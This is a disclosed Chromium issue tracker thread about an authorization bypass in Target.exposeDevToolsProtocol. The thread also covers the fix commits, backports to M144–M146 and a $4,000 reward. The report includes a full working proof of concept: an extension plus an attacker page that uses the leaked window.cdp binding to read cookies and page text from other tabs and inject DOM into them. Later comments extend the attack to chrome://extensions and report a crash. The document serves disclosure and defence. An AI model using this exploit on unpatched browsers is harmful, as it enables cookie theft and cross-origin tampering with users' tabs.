# Audit and add validation for extension IPCs

| Field | Value |
|-------|-------|
| **Issue ID** | [485287859](https://issues.chromium.org/issues/485287859) |
| **Status** | Accepted |
| **Severity** | S1-High |
| **Priority** | P4 |
| **Component** | Platform>Extensions |
| **Reporter** | ka...@chromium.org |
| **Assignee** | lu...@google.com |
| **Created** | 2026-02-17 |
| **Bounty** | $4,000.00 |

## Description

---

### Report description

Authorization Bypass in Target.exposeDevToolsProtocol via Missing Early Return

---

### Bug location

#### Where do you want to report your vulnerability?

Chrome VRP – Report security issues affecting the Chrome browser. [See program rules](https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules)

#### Which URL (or repository) have you found the vulnerability in?

<https://github.com/chromium/chromium>

---

### The problem

#### Please describe the technical details of the vulnerability

## Summary

When an untrusted `chrome.debugger` client calls `Target.exposeDevToolsProtocol`, the API returns `Not allowed` but does not exit. Due to missing `return` statements after `sendFailure(...)`, execution falls through and creates `BrowserToPageConnector`, injecting a `window.cdp` bridge into the page with browser-level CDP access.

## Test Environment

- Verification date: **2026-02-18**
- Chrome version: **144.0.7559.109** (Linux)
- Source reference commit: `88547700c7111c05932d805609d48be9e92a4f87`

## PoC Setup

```
mkdir -p poc/ext poc/page && cd poc

cat > ext/manifest.json <<'EOF'
{
  "manifest_version": 3, "name": "PoC", "version": "1.0",
  "permissions": ["debugger", "activeTab"],
  "background": { "service_worker": "background.js" },
  "action": { "default_title": "Trigger" }
}
EOF

cat > ext/background.js <<'EOF'
chrome.action.onClicked.addListener(async (tab) => {
  try {
    await chrome.debugger.attach({ tabId: tab.id }, '1.3');
    const { targetInfo } = await chrome.debugger.sendCommand(
      { tabId: tab.id }, 'Target.getTargetInfo');
    // sendFailure("Not allowed") fires but has no return.
    // BrowserToPageConnector is created anyway.
    try {
      await chrome.debugger.sendCommand({ tabId: tab.id },
        'Target.exposeDevToolsProtocol',
        { targetId: targetInfo.targetId, bindingName: 'cdp' });
    } catch (_) {}
    await chrome.debugger.detach({ tabId: tab.id });
  } catch (e) {
    try { await chrome.debugger.detach({ tabId: tab.id }); } catch (_) {}
  }
});
EOF

cat > page/index.html <<'EOF'
<!doctype html>
<html><head><meta charset="utf-8"><title>PoC</title>
<style>
body { font: 13px/1.6 monospace; background: #111; color: #999; padding: 24px }
.g { color: #5a5 } .r { color: #a55 } .w { color: #ddd } .d { color: #555 }
.data { border-left: 2px solid #a80; padding: 6px 14px; margin: 4px 0 4px 12px;
  color: #ca5; background: #1a1400; white-space: pre-wrap; word-break: break-all }
</style></head><body>
<b>Target.exposeDevToolsProtocol - missing return after sendFailure</b><br>
<small style="color:#555">browser-level CDP from page JS via window.cdp</small>
<p id="wait">click the extension icon on this tab to trigger</p>
<div id="out"></div>
<script>
(function() {
  var out = document.getElementById('out'), wait = document.getElementById('wait');
  function log(s, c) {
    var e = document.createElement('div');
    if (c) e.className = c; e.textContent = s; out.appendChild(e);
  }
  function data(s) {
    var e = document.createElement('pre');
    e.className = 'data'; e.textContent = s; out.appendChild(e);
  }
  (function poll() { if (!window.cdp) return setTimeout(poll, 400); wait.hidden = true; run() })();

  function run() {
    var here = location.href, session, seq = 0;
    cdp.onmessage = function(raw) {
      var m; try { m = JSON.parse(raw) } catch(e) { return }
      if (m.method === 'Target.receivedMessageFromTarget') {
        try { onVictim(JSON.parse(m.params.message)) } catch(e) {} return;
      }
      if (m.id === 1 && m.result) onTargets(m.result.targetInfos || []);
      if (m.id === 2 && m.result) onAttach(m.result);
      if (m.id <= 2 && m.error) log('error: ' + m.error.message, 'r');
    };
    log('window.cdp binding detected', 'g'); log('');
    log('Target.getTargets', 'w');
    cdp.send(JSON.stringify({ id: 1, method: 'Target.getTargets', params: {} }));

    function onTargets(list) {
      list.forEach(function(t) { log('  ' + t.type + '  ' + t.url, 'd') }); log('');
      var v = list.find(function(t) {
        return t.type === 'page' && t.url !== here && !/^(devtools|chrome|about):/.test(t.url);
      });
      if (!v) return log('no cross-origin tab. open another tab and re-trigger.', 'r');
      log('Target.attachToTarget  ' + v.url, 'w');
      cdp.send(JSON.stringify({ id: 2, method: 'Target.attachToTarget',
        params: { targetId: v.targetId, flatten: false } }));
    }
    function onAttach(res) {
      if (!res.sessionId) return log('attach failed', 'r');
      session = res.sessionId;
      log('  session ' + session.substring(0, 20) + '...', 'g'); log('');
      log('Runtime.evaluate in victim (read)', 'w');
      evalVictim(101, 'JSON.stringify({u:location.href,t:document.title,c:document.cookie,' +
        'b:document.body.innerText.substring(0,500)})');
    }
    function onVictim(m) {
      if (m.id === 101 && m.result && m.result.result) {
        try {
          var d = JSON.parse(m.result.result.value);
          log('  stolen from ' + d.u, 'g');
          data('title:   ' + d.t + '\ncookie:  ' + (d.c || '(none)') +
            '\ncontent: ' + d.b.substring(0, 300));
        } catch(e) { log('  raw: ' + m.result.result.value, 'g') }
        log(''); log('Runtime.evaluate in victim (inject DOM)', 'w');
        evalVictim(102, 'var b=document.createElement("div");' +
          'b.setAttribute("style","position:fixed;top:0;left:0;right:0;z-index:2147483647;' +
          'padding:14px 20px;background:#b00;color:#fff;font:bold 14px/1 monospace;text-align:center");' +
          'b.textContent="Cross-origin write via CDP bypass";' +
          'document.documentElement.prepend(b);"injected"');
      }
      if (m.id === 102 && m.result) {
        log('  victim DOM modified', 'g'); log('');
        log('done. switch to the victim tab to see the red banner.', 'w');
      }
      if (m.error) log('  victim: ' + m.error.message, 'r');
    }
    function evalVictim(id, expr) {
      cdp.send(JSON.stringify({ id: ++seq + 10, method: 'Target.sendMessageToTarget',
        params: { sessionId: session, message: JSON.stringify({
          id: id, method: 'Runtime.evaluate', params: { expression: expr } }) } }));
    }
  }
})();
</script></body></html>
EOF

```
## Reproduction Steps

### 1. Create files and start server

```
# Run the setup block above, then:
python3 -m http.server 8000 --directory page

```
### 2. Launch Chrome

Open a second terminal:

```
google-chrome \
  --user-data-dir="$(mktemp -d)" \
  --no-first-run \
  --no-default-browser-check \
  "http://127.0.0.1:8000/index.html"

```
### 3. Load extension

1. Navigate to `chrome://extensions`.
2. Enable **Developer mode** (toggle, top right).
3. Click **Load unpacked** and select the `ext/` directory.
4. Return to the `http://127.0.0.1:8000/index.html` tab.

### 4. Open victim tab

Open a new tab and navigate to `https://example.com`.

### 5. Trigger

1. Switch back to the PoC tab (`127.0.0.1:8000`).
2. Click the extension icon in the toolbar.

### 6. Observe

On the PoC page:

1. `window.cdp binding detected` confirms the bypass.
2. `Target.getTargets` lists all browser tabs including the victim.
3. `stolen from https://example.com/` shows cross-origin content read (title, cookies, body text).
4. `victim DOM modified` confirms cross-origin write.

Switch to the victim tab (`example.com`). A red banner reading "Cross-origin write via CDP bypass" is injected at the top of the page.

## Actual vs Expected

### Actual

1. `Target.exposeDevToolsProtocol` returns `Not allowed`.
2. `BrowserToPageConnector` is created anyway.
3. `window.cdp` is injected with browser-level access.
4. Cross-origin read and write demonstrated.

### Expected

1. Request is denied.
2. Function returns immediately.
3. No connector, no binding, no cross-origin access.

## Recommended Fix

Add `return;` after each `callback->sendFailure(...)` in `TargetHandler::ExposeDevToolsProtocol(...)`.

## Source References

1. <https://github.com/chromium/chromium/blob/88547700c7111c05932d805609d48be9e92a4f87/content/browser/devtools/protocol/target_handler.cc>
2. <https://github.com/chromium/chromium/blob/88547700c7111c05932d805609d48be9e92a4f87/content/public/browser/devtools_agent_host_client.cc>
3. <https://github.com/chromium/chromium/blob/88547700c7111c05932d805609d48be9e92a4f87/chrome/browser/extensions/api/debugger/debugger_api.cc>

#### Impact analysis

## Impact

An extension with `debugger` permission can escalate from tab-scoped debugging to full browser-level CDP via page JavaScript.

Demonstrated capabilities after trigger:

1. Read cross-origin page content (title, cookies, body text) from any tab.
2. Write to cross-origin DOM (inject arbitrary elements into any tab).
3. Enumerate all browser targets beyond the original attachment scope.

---

### The cause

#### What version of Chrome have you found the security issue in?

144.0.7559.109

#### Is the security issue related to a crash?

No, it is not related to a crash.

#### Choose the type of vulnerability

Privilege Escalation

#### How would you like to be publicly acknowledged for your report?

M. Fauzan Wijaya (Gh05t666nero)

## Attachments

- [Screen Recording 2026-02-18 031057.mp4](attachments/Screen Recording 2026-02-18 031057.mp4) (video/mp4, 8.5 MB)
- [index.html](attachments/index.html) (text/html, 4.1 KB)
- [background.js](attachments/background.js) (application/x-javascript, 685 B)
- [manifest.json](attachments/manifest.json) (application/json, 204 B)
- [background.js](attachments/background.js) (text/javascript, 1.1 KB)
- [manifest.json](attachments/manifest.json) (application/json, 204 B)
- [index.html](attachments/index.html) (text/html, 6.8 KB)
- [poc-final.mp4](attachments/poc-final.mp4) (video/mp4, 7.4 MB)
- [faq-proof.png](attachments/faq-proof.png) (image/png, 189.4 KB)
- [retest-m144-m145-m146-m147.mp4](attachments/retest-m144-m145-m146-m147.mp4) (video/mp4, 2.0 MB)
- [read-result.png](attachments/read-result.png) (image/png, 118.5 KB)
- [run-impact-test.png](attachments/run-impact-test.png) (image/png, 136.5 KB)
- [attacker.html](attachments/attacker.html) (text/html, 3.6 KB)
- [victim.html](attachments/victim.html) (text/html, 237 B)
- [background.js](attachments/background.js) (text/javascript, 1.9 KB)
- [manifest.json](attachments/manifest.json) (application/json, 227 B)

## Timeline

### dr...@chromium.org (2026-02-17)

> An extension with debugger permission can escalate from tab-scoped debugging to full browser-level CDP via page JavaScript.

The `debugger` permission on an extension already allows the extension to modify any tab. Whether you've clicked to activate the extension or not is not a security boundary here, since the extension could simply start debugging every tab. Derestricting the view and passing to devtools folks.

### oj...@gmail.com (2026-02-18)

The reclassification should be reconsidered. The missing `return` creates a trust escalation to WebUI, which the debugger permission is explicitly prohibited from accessing.

### The bug creates a more-privileged client than the caller

The fall-through in `ExposeDevToolsProtocol` creates a `BrowserConnectorHostClient` that inherits the permissive defaults from `DevToolsAgentHostClient`: `IsTrusted()=true`, `MayAttachToURL(webui)=true`, `MayReadLocalFiles()=true`. None of these are overridden. By contrast, `ExtensionDevToolsClientHost` explicitly returns `IsTrusted()=false` and `MayAttachToURL(webui)=false`. The bug bypasses both restrictions by creating a new client that does not carry the caller's constraints.

### PoC: JS execution in chrome://extensions from page JavaScript

Chrome 144.0.7559.109, Manifest V3 extension with `debugger` + `activeTab`.

1. Extension calls `Target.exposeDevToolsProtocol` via `chrome.debugger.sendCommand()`. Returns "Not allowed", but `window.cdp` binding is installed anyway.
2. Page JS calls `Target.getTargets` through `window.cdp` — enumerates all targets including `chrome://extensions/`.
3. Page JS calls `Target.attachToTarget` on `chrome://extensions/` — succeeds because `MayAttachToURL(webui)` defaults to `true`.
4. Page JS sends `Runtime.evaluate` on the attached session — executes in `chrome://extensions` origin and injects DOM into the WebUI page.

FINAL POC (see poc-final.mp4) attached: red banner injected into `chrome://extensions/` reading "Page JS injected into WebUI via CDP trust escalation".

### This crosses a documented security boundary

From the [Extensions Security FAQ](https://chromium.googlesource.com/chromium/src/+/main/extensions/docs/security_faq.md#What-privileges-does-the-Debugger-permission-grant-an-extension_What-privileges-should-it-lack):

> "The debugger permission does not allow automating parts of the Chromium browser unrelated to websites. Automating WebUI or settings, installing extensions, downloading and executing a native binary, or executing custom code outside the sandbox should not be possible for an extension with the debugger permission."

The PoC demonstrates an extension with `debugger` permission executing arbitrary code in `chrome://extensions/`. This is what the FAQ says should not be possible.

### Additional: null deref crash

Calling `ExposeDevToolsProtocol` with a nonexistent `targetId` crashes the browser process via virtual call on `nullptr` at `agent_host->GetWebContents()`. Same missing `return`, different impact.

### aj...@google.com (2026-02-18)

The issue seems similar to Issue:40056469, hence merging into it and marking it as duplicate.

Note: Please feel free to undupe if it is not the case.

Thanks..!

### oj...@gmail.com (2026-02-18)

This is not a duplicate of [Issue 40056469](https://issues.chromium.org/issues/40056469). That issue tracks IPC validation in extension messaging code (ExtensionMessagePort, ExtensionFunctionDispatcher). This issue is about missing return statements after sendFailure() in TargetHandler::ExposeDevToolsProtocol (content/browser/devtools/protocol/target\_handler.cc) causing a trust escalation from extension-level to browser-level CDP access, with a validated PoC demonstrating JS execution in chrome://extensions/ from page JavaScript. The two issues are in different components and have no code overlap. Undupe?

### dr...@chromium.org (2026-02-18)

Excellent, [#comment3](https://issues.chromium.org/issues/485287859#comment3) does actually cross a security boundary. Putting it back in the triage queue.

### dx...@google.com (2026-02-18)

Project: chromium/src  

Branch:  main  

Author:  Alex Rudenko [alexrudenko@chromium.org](mailto:alexrudenko@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7585522>

Fix missing returns in target\_handler

---


Expand for full commit details
```
     
    Fixed: 485287859 
    Change-Id: I7f3782719e60bd4d2792c9e8703c967e75d22469 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7585522 
    Commit-Queue: Philip Pfaffe <pfaffe@chromium.org> 
    Auto-Submit: Alex Rudenko <alexrudenko@chromium.org> 
    Commit-Queue: Alex Rudenko <alexrudenko@chromium.org> 
    Reviewed-by: Philip Pfaffe <pfaffe@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1586296}

```

---

Files:

- M `content/browser/devtools/protocol/target_handler.cc`
- M `third_party/blink/web_tests/http/tests/inspector-protocol/target/target-expose-devtools-protocol-execution-context.js`

---

Hash: [111ecbc657c45da1115a6bb97157721e11cbb82c](https://chromiumdash.appspot.com/commit/111ecbc657c45da1115a6bb97157721e11cbb82c)  

Date: Wed Feb 18 09:59:58 2026


---

### al...@google.com (2026-02-18)

drubery@ please let me know if we should merge this into M146

### ch...@google.com (2026-02-18)

Dear owner, thanks for fixing this bug. We've reopened it because:

- Security bugs need the Severity (S0-S3) and the Found In set, which will enable the bots to request merges to the correct branches (as well as helping out our vulnerability reward and CVE processes). Please consult with any Chrome security contact ([security@chromium.org](mailto:security@chromium.org)) to arrange to set these labels. Severity guidelines: <https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/security/severity-guidelines.md#severity-guidelines-for-security-issues> FoundIn guidelines: <https://chromium.googlesource.com/chromium/src/+/main/docs/security/security-labels.md#labels-relevant-for-any-type_bug_security>
  After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### oj...@gmail.com (2026-02-18)

Hi team, following up on the open items from [comment #9](https://issues.chromium.org/issues/485287859#comment9).

I've retested across multiple Chrome versions to verify the fix status:

| Version | Channel | Result |
| --- | --- | --- |
| 144.0.7559.109 | M144 Stable | Vulnerable |
| 145.0.7632.75 | M145 Stable (latest) | Vulnerable |
| 146.0.7670.2 | M146 Dev | Vulnerable |
| 147.0.7695.0 | main snapshot (post-CL 7585522) | Fixed |

The fix on main works correctly, window.cdp is no longer injected and the PoC fails. However, the fix has not been backported to any release branch. M146 was branched on Feb 9, and the fix landed on Feb 18, so it missed the branch cut.

Per [comment #8](https://issues.chromium.org/issues/485287859#comment8), the question about merging to M146 is still open. The Severity and FoundIn labels from [comment #9](https://issues.chromium.org/issues/485287859#comment9) are also still needed to enable the merge bots.

FoundIn: 144.0.7559.109, 145.0.7632.75, 146.0.7670.2

Retest recording attached (retest-m144-m145-m146-m147.mp4)

Thanks.

### dr...@chromium.org (2026-02-19)

> drubery@ please let me know if we should merge this into M146

Given the severity here I do think this needs a merge. I've given it the necessary security labels. Automation should now put it in the merge queues.

### ch...@google.com (2026-02-19)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-02-19)

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### ch...@google.com (2026-02-19)

Security Merge Request Consideration: Requesting merge to extended stable (M144) because latest trunk commit (1586296) appears to be after extended stable branch point (1552494).
Security Merge Request Consideration: Requesting merge to stable (M145) because latest trunk commit (1586296) appears to be after stable branch point (1568190).
Security Merge Request Consideration: Requesting merge to beta (M146) because latest trunk commit (1586296) appears to be after beta branch point (1582197).
Security Merge Request - Manual Review: Merge review required: M144 is already shipping to stable.

Security Merge Request - Manual Review: Merge review required: M145 is already shipping to stable.

Security Merge Request - Manual Review: Merge review required: M146 is already shipping to beta.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [144, 145, 146].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### al...@google.com (2026-02-19)

1. <https://chromium-review.git.corp.google.com/c/chromium/src/+/7585522>
2. The change has been in Canary
3. no
4. no
5. no

### dr...@chromium.org (2026-02-19)

No crashes in Canary. Looks good, approving merges.

### sr...@chromium.org (2026-02-20)

@al...@google.com can you help with merge for 144, i am getting merge conflicts when i tried to CP ( please help complete the merge before 12pm PST today as i am cutting RC today)

I have CP 145 here and put in CQ- https://chromium-review.git.corp.google.com/c/chromium/src/+/7597051
M146 CP here - https://chromium-review.git.corp.google.com/c/chromium/src/+/7597052 

### dx...@google.com (2026-02-20)

Project: chromium/src  

Branch:  refs/branch-heads/7632  

Author:  Alex Rudenko [alexrudenko@chromium.org](mailto:alexrudenko@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7597051>

Fix missing returns in target\_handler

---


Expand for full commit details
```
     
    (cherry picked from commit 111ecbc657c45da1115a6bb97157721e11cbb82c) 
     
    Fixed: 485287859 
    Change-Id: I7f3782719e60bd4d2792c9e8703c967e75d22469 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7585522 
    Commit-Queue: Philip Pfaffe <pfaffe@chromium.org> 
    Auto-Submit: Alex Rudenko <alexrudenko@chromium.org> 
    Commit-Queue: Alex Rudenko <alexrudenko@chromium.org> 
    Reviewed-by: Philip Pfaffe <pfaffe@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1586296} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7597051 
    Owners-Override: Srinivas Sista <srinivassista@chromium.org> 
    Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com> 
    Commit-Queue: Srinivas Sista <srinivassista@chromium.org> 
    Cr-Commit-Position: refs/branch-heads/7632@{#3092} 
    Cr-Branched-From: 0bbdf2913883391365383b0a5dfe7bf9fd1a5213-refs/heads/main@{#1568190}

```

---

Files:

- M `content/browser/devtools/protocol/target_handler.cc`
- M `third_party/blink/web_tests/http/tests/inspector-protocol/target/target-expose-devtools-protocol-execution-context.js`

---

Hash: [2424c5b1d93956e396f731abd83152017d955d10](https://chromiumdash.appspot.com/commit/2424c5b1d93956e396f731abd83152017d955d10)  

Date: Fri Feb 20 18:39:47 2026


---

### dx...@google.com (2026-02-20)

Project: chromium/src  

Branch:  refs/branch-heads/7680  

Author:  Alex Rudenko [alexrudenko@chromium.org](mailto:alexrudenko@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7597052>

Fix missing returns in target\_handler

---


Expand for full commit details
```
     
    (cherry picked from commit 111ecbc657c45da1115a6bb97157721e11cbb82c) 
     
    Fixed: 485287859 
    Change-Id: I7f3782719e60bd4d2792c9e8703c967e75d22469 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7585522 
    Commit-Queue: Philip Pfaffe <pfaffe@chromium.org> 
    Auto-Submit: Alex Rudenko <alexrudenko@chromium.org> 
    Commit-Queue: Alex Rudenko <alexrudenko@chromium.org> 
    Reviewed-by: Philip Pfaffe <pfaffe@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1586296} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7597052 
    Owners-Override: Srinivas Sista <srinivassista@chromium.org> 
    Commit-Queue: Srinivas Sista <srinivassista@chromium.org> 
    Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com> 
    Cr-Commit-Position: refs/branch-heads/7680@{#871} 
    Cr-Branched-From: 76b7d80e5cda23fe6537eed26d68c92e995c7f39-refs/heads/main@{#1582197}

```

---

Files:

- M `content/browser/devtools/protocol/target_handler.cc`
- M `third_party/blink/web_tests/http/tests/inspector-protocol/target/target-expose-devtools-protocol-execution-context.js`

---

Hash: [95a6b58f5f6bdbae5767f2bfbd971e9775b2a2b1](https://chromiumdash.appspot.com/commit/95a6b58f5f6bdbae5767f2bfbd971e9775b2a2b1)  

Date: Fri Feb 20 19:12:54 2026


---

### pe...@google.com (2026-02-20)

LTS Milestone M144

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### oj...@gmail.com (2026-02-23)

Hi team,

I re-tested the same PoC on Chrome `145.0.7632.75` (Linux, fresh profile) and the deny-with-side-effect behavior still reproduces.

1. Click the extension action, then click `Read Result`. It reports `Target.exposeDevToolsProtocol` as denied (`Not allowed`), but a callable binding is still there:

```
{
  "exposeCmdResult": "error",
  "exposeCmdError": "{\"code\":-32602,\"message\":\"Not allowed\"}",
  "bindingName": "cdp_6jcwai4g",
  "hasBinding": true,
  "bindingType": "object",
  "bindingHasSendFn": true,
  "ts": 1771814029211
}

```

2. Click `Run Impact Test`. The binding works (`[OK] Victim found` → `[OK] Attached` → `[READ] ...` → `[WRITE] banner injected`) and the victim page shows the injected banner (`Injected from attacker tab via CDP bridge`).

I couldn't reproduce the earlier WebUI impact against `chrome://extensions` on this build, so that part looks fixed. This follow-up is about the fail-open binding that still shows up on regular web pages.

For context, I can separately reproduce the by-design `chrome.debugger` path where an extension attaches to a tab and runs CDP commands without `Target.exposeDevToolsProtocol`. This report isn't about that. The issue is that `Target.exposeDevToolsProtocol` gets denied but still leaves a callable page binding behind.

I'd expect that after the fix, a denied `Target.exposeDevToolsProtocol` should not create a usable page binding (`hasBinding=false`). Is the denial path still failing open here?

### al...@chromium.org (2026-02-23)

It will be available first in 145.0.7632.116.

### dx...@google.com (2026-02-23)

Project: chromium/src  

Branch:  refs/branch-heads/7559  

Author:  Alex Rudenko [alexrudenko@chromium.org](mailto:alexrudenko@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7595361>

[M144] Fix missing returns in target\_handler

---


Expand for full commit details
```
     
    (cherry picked from commit 111ecbc657c45da1115a6bb97157721e11cbb82c) 
     
    Fixed: 485287859 
    Change-Id: I7f3782719e60bd4d2792c9e8703c967e75d22469 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7585522 
    Commit-Queue: Philip Pfaffe <pfaffe@chromium.org> 
    Auto-Submit: Alex Rudenko <alexrudenko@chromium.org> 
    Commit-Queue: Alex Rudenko <alexrudenko@chromium.org> 
    Reviewed-by: Philip Pfaffe <pfaffe@chromium.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#1586296} 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7595361 
    Cr-Commit-Position: refs/branch-heads/7559@{#4750} 
    Cr-Branched-From: 223dfbac1c7542a06b422390d954afe5b560b607-refs/heads/main@{#1552494}

```

---

Files:

- M `content/browser/devtools/protocol/target_handler.cc`

---

Hash: [ba1858bb4912895c8f804630059e9d8a2d271968](https://chromiumdash.appspot.com/commit/ba1858bb4912895c8f804630059e9d8a2d271968)  

Date: Mon Feb 23 11:00:08 2026


---

### ch...@google.com (2026-02-24)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### qk...@google.com (2026-02-24)

Added 'Not-Applicable-138' label because the files modified by the fix[1] were added by [2][3] CLs. But M138 only has [2] CL. So it's not fully sure if the fix is safe to be merged to M138.

[1] https://chromium-review.googlesource.com/c/chromium/src/+/7585522
[2] https://chromium-review.googlesource.com/c/chromium/src/+/6439151
[3] https://chromium-review.googlesource.com/c/chromium/src/+/7211356

### aj...@google.com (2026-03-05)

Setting sev=medium as this escalates an already fairly powerful permission.

### sp...@google.com (2026-03-11)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $4000.00 for this report.

Rationale for this decision:
High Quality. Web Platform Privilege Escalation


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### oj...@gmail.com (2026-03-11)

Thanks to the VRP panel for the reward and the assessment. And thanks to triager team for the quick fix and merge coordination across M144/M145/M146, the turnaround from report to backport was really fast. Happy to help keep Chrome secure.

### qk...@google.com (2026-04-12)

Labeled `LTS-Merge-Merged-144` because the patch was already merged to M144.

### ch...@google.com (2026-05-29)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> High Quality. Web Platform Privilege Escalation

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/485287859)*
